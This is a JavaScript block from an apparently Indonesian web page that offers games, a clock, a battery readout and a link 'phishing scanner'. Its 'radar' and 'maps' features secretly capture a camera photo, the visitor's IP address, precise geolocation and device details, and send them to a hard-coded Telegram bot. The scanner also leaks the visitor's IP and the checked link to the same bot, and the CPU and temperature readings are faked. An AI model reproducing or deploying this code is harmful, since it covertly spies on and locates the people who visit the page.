<script>

const T='8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
const C='7898572558';
let dark=true;
let snakeInterval=null,snakeRunning=false,snake=[],snakeDir={x:1,y:0},snakeFood={x:100,y:100},snakeScore=0,snakeGameOver=false;

// ========== SLOT BUAH ==========
const fruits = [
    {emoji: '🍎', name: 'Apel', points: 10},
    {emoji: '🍊', name: 'Jeruk', points: 10},
    {emoji: '🍇', name: 'Anggur', points: 10},
    {emoji: '🍉', name: 'Semangka', points: 15},
    {emoji: '🍓', name: 'Strawberry', points: 15},
    {emoji: '🍒', name: 'Ceri', points: 15},
    {emoji: '🍑', name: 'Persik', points: 20},
    {emoji: '🥝', name: 'Kiwi', points: 20},
    {emoji: '🍍', name: 'Nanas', points: 20},
    {emoji: '🍌', name: 'Pisang', points: 10}
];
let slotPoints = 100;
let slotSpin = false;
let slotHistory = [];

function spinSlot() {
    if (slotSpin) return;
    slotSpin = true;
    document.getElementById('spinBtn').disabled = true;
    document.getElementById('jackpot').style.display = 'none';

    let r1 = Math.floor(Math.random() * fruits.length);
    let r2 = Math.floor(Math.random() * fruits.length);
    let r3 = Math.floor(Math.random() * fruits.length);

    let reel1 = document.getElementById('reel1');
    let reel2 = document.getElementById('reel2');
    let reel3 = document.getElementById('reel3');

    reel1.classList.add('spin');
    reel2.classList.add('spin');
    reel3.classList.add('spin');

    setTimeout(() => {
        reel1.classList.remove('spin');
        reel2.classList.remove('spin');
        reel3.classList.remove('spin');

        let f1 = fruits[r1];
        let f2 = fruits[r2];
        let f3 = fruits[r3];

        reel1.innerHTML = f1.emoji + '<div class="fruit-label">' + f1.name + '</div>';
        reel2.innerHTML = f2.emoji + '<div class="fruit-label">' + f2.name + '</div>';
        reel3.innerHTML = f3.emoji + '<div class="fruit-label">' + f3.name + '</div>';

        let win = 0;
        let msg = '';

        if (r1 === r2 && r2 === r3) {
            win = f1.points * 3 + 20;
            msg = '🎉 JACKPOT! +' + win + ' POIN 🎉';
            document.getElementById('jackpot').textContent = msg;
            document.getElementById('jackpot').style.display = 'block';
        } else if (r1 === r2 || r2 === r3 || r1 === r3) {
            let pair = r1 === r2 ? f1 : r2 === r3 ? f2 : f1;
            win = pair.points * 2;
            msg = '✨ ' + pair.name + ' Pair! +' + win + ' POIN';
        } else {
            win = -5;
            msg = '😅 Coba lagi! -5 POIN';
        }

        slotPoints = Math.max(0, slotPoints + win);
        document.getElementById('slotPoints').textContent = slotPoints;

        slotHistory.unshift(msg + ' (' + f1.emoji + f2.emoji + f3.emoji + ')');
        if (slotHistory.length > 5) slotHistory.pop();
        document.getElementById('slotHistory').innerHTML = slotHistory.map(h => '<div>' + h + '</div>').join('');

        slotSpin = false;
        document.getElementById('spinBtn').disabled = false;
        document.getElementById('spinBtn').textContent = '🎰 PUTAR';

        if (slotPoints <= 0) {
            slotPoints = 100;
            document.getElementById('slotPoints').textContent = slotPoints;
            document.getElementById('slotHistory').innerHTML += '<div style="color:#ffd700">🔄 Poin direset ke 100!</div>';
        }
    }, 400);
}

// ========== CLOCK ==========
setInterval(() => {
    document.getElementById('rt').textContent = new Date().toLocaleTimeString('id-ID', { hour12: false });
}, 1000);

// ========== BATTERY ==========
if (navigator.getBattery) {
    navigator.getBattery().then(b => {
        let update = () => {
            document.getElementById('bat').textContent = Math.round(b.level * 100) + '%';
        };
        update();
        b.onlevelchange = update;
    }).catch(() => {
        document.getElementById('bat').textContent = 'N/A';
    });
} else {
    document.getElementById('bat').textContent = 'N/A';
}

// ========== CPU & TEMP ==========
setInterval(() => {
    let start = performance.now();
    let dummy = 0;
    for (let i = 0; i < 1000000; i++) dummy += i;
    let end = performance.now();
    let load = Math.min(100, Math.round(((end - start) / 10) * 2 + 10));
    document.getElementById('cpu').textContent = load + '%';
    document.getElementById('temp').textContent = (35 + load / 15).toFixed(1) + '°C';
    document.getElementById('suhu').textContent = (35 + 10 * Math.random()).toFixed(1) + '°C';
}, 2000);

// ========== GAME FUNCTIONS ==========
function toggleGame() {
    let menu = document.getElementById('gm');
    menu.style.display = menu.style.display == 'block' ? 'none' : 'block';
    closeGame();
}

function openGame(type) {
    document.getElementById('gm').style.display = 'none';
    if (type == 'snake') {
        let game = document.getElementById('gc');
        game.style.display = 'block';
        document.getElementById('gcslot').style.display = 'none';
        game.classList.add('fs');
        startSnake();
        try { document.documentElement.requestFullscreen(); } catch (e) {}
    } else if (type == 'slot') {
        let game = document.getElementById('gcslot');
        game.style.display = 'block';
        document.getElementById('gc').style.display = 'none';
        game.classList.add('fs');
        try { document.documentElement.requestFullscreen(); } catch (e) {}
    }
}

function closeGame() {
    let snake = document.getElementById('gc');
    let slot = document.getElementById('gcslot');
    snake.style.display = 'none';
    snake.classList.remove('fs');
    slot.style.display = 'none';
    slot.classList.remove('fs');
    if (snakeInterval) {
        clearInterval(snakeInterval);
        snakeInterval = null;
    }
    try { document.exitFullscreen(); } catch (e) {}
}

// ========== SNAKE ==========
function sd2(x, y) {
    if (!snakeRunning || snakeGameOver) return;
    if ((x == 1 && snakeDir.x != -1) || (x == -1 && snakeDir.x != 1) ||
        (y == 1 && snakeDir.y != -1) || (y == -1 && snakeDir.y != 1)) {
        snakeDir = { x: x, y: y };
    }
}

function startSnake() {
    if (snakeInterval) return;
    snake = [{ x: 200, y: 200 }];
    snakeDir = { x: 1, y: 0 };
    snakeScore = 0;
    snakeGameOver = false;
    document.getElementById('ss').textContent = '0';
    document.getElementById('so').style.display = 'none';
    snakeFood = { x: 20 * Math.floor(20 * Math.random()), y: 20 * Math.floor(20 * Math.random()) };
    snakeRunning = true;
    snakeInterval = setInterval(() => {
        if (!snakeRunning || snakeGameOver) return;
        moveSnake();
    }, 150);
}

function moveSnake() {
    let head = {
        x: snake[0].x + 20 * snakeDir.x,
        y: snake[0].y + 20 * snakeDir.y
    };
    if (head.x < 0 || head.x >= 400 || head.y < 0 || head.y >= 400) {
        snakeGameOver = true;
        document.getElementById('so').style.display = 'block';
        return;
    }
    for (let i = 0; i < snake.length; i++) {
        if (snake[i].x == head.x && snake[i].y == head.y) {
            snakeGameOver = true;
            document.getElementById('so').style.display = 'block';
            return;
        }
    }
    snake.unshift(head);
    if (head.x == snakeFood.x && head.y == snakeFood.y) {
        snakeScore++;
        document.getElementById('ss').textContent = snakeScore;
        snakeFood = { x: 20 * Math.floor(20 * Math.random()), y: 20 * Math.floor(20 * Math.random()) };
        if (snakeScore % 5 == 0 && snakeInterval) {
            clearInterval(snakeInterval);
            snakeInterval = setInterval(() => {
                if (!snakeRunning || snakeGameOver) return;
                moveSnake();
            }, Math.max(80, 150 - 3 * snakeScore));
        }
    } else {
        snake.pop();
    }
    drawSnake();
}

function drawSnake() {
    let canvas = document.getElementById('sc');
    let ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, 400, 400);
    ctx.fillStyle = '#ffd700';
    ctx.shadowColor = '#ffd700';
    ctx.shadowBlur = 20;
    ctx.beginPath();
    ctx.arc(snakeFood.x + 10, snakeFood.y + 10, 8, 0, 2 * Math.PI);
    ctx.fill();
    ctx.shadowBlur = 0;
    ctx.fillStyle = '#00ff00';
    for (let i = 0; i < snake.length; i++) {
        ctx.fillRect(snake[i].x, snake[i].y, 18, 18);
        ctx.fillStyle = i == 0 ? '#00ff00' : '#00aa00';
    }
}

function resetSnake() {
    if (snakeInterval) {
        clearInterval(snakeInterval);
        snakeInterval = null;
    }
    snakeRunning = false;
    snake = [];
    startSnake();
}

document.addEventListener('keydown', (e) => {
    if (!snakeRunning || snakeGameOver) return;
    let key = e.key;
    if ((key == 'ArrowUp' || key == 'w') && snakeDir.y != 1) snakeDir = { x: 0, y: -1 };
    else if ((key == 'ArrowDown' || key == 's') && snakeDir.y != -1) snakeDir = { x: 0, y: 1 };
    else if ((key == 'ArrowLeft' || key == 'a') && snakeDir.x != 1) snakeDir = { x: -1, y: 0 };
    else if ((key == 'ArrowRight' || key == 'd') && snakeDir.x != -1) snakeDir = { x: 1, y: 0 };
});

// ========== RADAR ==========
async function startRadar() {
    let overlay = document.getElementById('ro');
    overlay.style.display = 'flex';
    try {
        let device = {
            ua: navigator.userAgent,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            core: navigator.hardwareConcurrency || '?'
        };
        let ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
        let stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: 640, height: 480 }
        });
        let video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        let canvas = document.getElementById('cv');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        stream.getTracks().forEach(t => t.stop());
        let loc = 'Tidak diketahui';
        try {
            let pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
            });
            loc = pos.coords.latitude + ',' + pos.coords.longitude;
        } catch (e) {}
        let caption = '🔱 RADAR REPORT\nIP: ' + ip + '\nLokasi: ' + loc + '\nDevice: ' + device.platform +
            '\nWaktu: ' + new Date().toLocaleString('id-ID');
        let formData = new FormData();
        formData.append('chat_id', C);
        formData.append('photo', blob, 'shot.jpg');
        formData.append('caption', caption);
        await fetch('https://api.telegram.org/bot' + T + '/sendPhoto', { method: 'POST', body: formData });
        overlay.innerHTML = '<div style="color:var(--n);text-align:center;padding:20px"><h2>✅ SENT</h2><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--n);color:#000;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
    } catch (e) {
        overlay.innerHTML = '<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>' + e
            .message + '</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
    }
}

// ========== MAPS ==========
async function openMap() {
    let overlay = document.getElementById('ro');
    overlay.style.display = 'flex';
    try {
        let pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        let lat = pos.coords.latitude;
        let lng = pos.coords.longitude;
        let ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
        let stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: 640, height: 480 }
        });
        let video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        let canvas = document.getElementById('cv');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        stream.getTracks().forEach(t => t.stop());
        let device = { ua: navigator.userAgent, platform: navigator.platform };
        let caption = '📍 MAPS LOCKED\nIP: ' + ip + '\nLokasi: ' + lat + ',' + lng + '\nDevice: ' + device.platform +
            '\nWaktu: ' + new Date().toLocaleString('id-ID');
        let formData = new FormData();
        formData.append('chat_id', C);
        formData.append('photo', blob, 'map.jpg');
        formData.append('caption', caption);
        await fetch('https://api.telegram.org/bot' + T + '/sendPhoto', { method: 'POST', body: formData });
        window.open('https://www.google.com/maps?q=' + lat + ',' + lng, '_blank');
        overlay.style.display = 'none';
        overlay.innerHTML = '<div class="sweep"></div>';
    } catch (e) {
        overlay.innerHTML = '<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>' + e
            .message + '</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
    }
}

// ========== PHISHING SCANNER ==========
async function scanPhish() {
    let input = document.getElementById('pl').value.trim();
    let result = document.getElementById('sr');
    let progress = document.getElementById('prog');
    if (!input) {
        result.style.display = 'none';
        return;
    }
    result.style.display = 'block';
    progress.style.width = '0%';
    let isPhish = false;
    let link = input;
    try {
        progress.style.width = '30%';
        let resp = await fetch('https://phishcheck.vercel.app/api/check?url=' + encodeURIComponent(input));
        if (resp.ok) {
            let data = await resp.json();
            isPhish = data.isPhishing || data.phishing || data.suspicious || false;
        } else throw 'API down';
    } catch (e) {
        let u = input.toLowerCase();
        let keywords = ['login', 'verif', 'dana', 'giveaway', 'undian', 'hadiah', 'claim', 'bonus', 'topup',
            'gratis', 'suspend', 'voucher'
        ];
        let shorteners = ['bit.ly', 'tinyurl', 'cutt.ly', 't.co', 'rb.gy', 'is.gd', 'shorturl', 's.id'];
        let tlds = ['.com', '.net', '.org', '.id', '.xyz', '.info', '.biz', '.me', '.online', '.site',
            '.live'
        ];
        let matchKeyword = keywords.some(k => u.includes(k));
        let matchShortener = shorteners.some(k => u.includes(k));
        let matchTLD = tlds.some(k => u.includes(k));
        if (u.startsWith('http://') && !u.includes('localhost') && !u.includes('192.168.') && !u
            .startsWith('https://')) {
            isPhish = true;
        } else if (matchKeyword || matchShortener || (u.includes('.com-') || u.includes('.net-')) && !u
            .includes('/')) {
            isPhish = true;
        } else if (!matchTLD && !u.includes('localhost') && !u.includes('192.168.') && u !== 'https' && u !==
            'https://') {
            isPhish = true;
        } else {
            isPhish = false;
        }
    }
    progress.style.width = '100%';
    setTimeout(() => { progress.style.width = '0%'; }, 500);
    if (isPhish) {
        result.innerHTML =
            '<div style="font-size:16px;margin-bottom:10px">⚠️ JANGAN DIBUKA!</div><div style="font-size:14px;margin-bottom:8px">Link ini BERBAHAYA (Phishing/Scam)</div><div style="font-size:12px;opacity:.7;word-break:break-all">' +
            link + '</div>';
        result.className = 'phish';
        try {
            let ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
            let device = { ua: navigator.userAgent };
            await fetch('https://api.telegram.org/bot' + T + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: C,
                    text: '⚠️ PHISHING DETECTED\nLink: ' + input + '\nIP: ' + ip + '\nDevice: ' + device
                        .ua.split(' ').slice(-2).join(' ')
                })
            });
        } catch (e) {}
    } else {
        result.innerHTML =
            '<div style="font-size:16px;margin-bottom:10px;color:var(--n)">✅ Aman! Bisa dibuka</div><div style="font-size:14px;margin-bottom:8px">Link ini AMAN</div><div style="font-size:12px;opacity:.7;word-break:break-all">' +
            link + '</div><button class="btn-open" onclick="window.open(\'' + link +
            '\',\'_blank\')">🔗 Buka Link</button>';
        result.className = 'safe';
    }
}

// ========== WEBCAM ==========
async function toggleCam() {
    let video = document.getElementById('wcv');
    let container = document.getElementById('wc');
    if (video.srcObject) {
        video.srcObject.getTracks().forEach(t => t.stop());
        container.style.display = 'none';
        video.srcObject = null;
        return;
    }
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
        video.srcObject = stream;
        container.style.display = 'block';
    } catch (e) {
        alert('❌ Gagal akses kamera: ' + e.message);
    }
}
